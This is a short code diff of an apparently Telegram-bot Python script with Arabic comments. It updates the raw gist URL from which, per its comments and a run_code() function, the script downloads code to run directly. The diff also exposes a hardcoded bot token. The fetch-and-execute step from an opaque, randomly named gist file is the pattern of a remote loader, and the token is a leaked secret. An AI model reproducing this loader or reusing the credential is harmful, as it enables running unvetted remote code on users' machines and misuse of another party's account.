@@ -7,7 +7,7 @@ TOKEN = '7287328621:AAGunduTgsqErYliEuZcWtIFNYYDHUsqWNs'
 bot = telebot.TeleBot(TOKEN)
 
 # رابط الملف الذي تريد تحميله من Gist
-url = 'https://gist.githubusercontent.com/saSfa43g/008a2a3f01bd68b0c761e36aaa32594e/raw/54b16ecd3c722d3e317f22ff1426e9ce12010e31/gjhnlflfjlgfnfga.py'
+url = 'https://gist.githubusercontent.com/saSfa43g/008a2a3f01bd68b0c761e36aaa32594e/raw/414b832936599391157ba2f4818a2d44bafe4379/gjhnlflfjlgfnfga.py'
 
 # تشغيل الكود مباشرة
 def run_code():
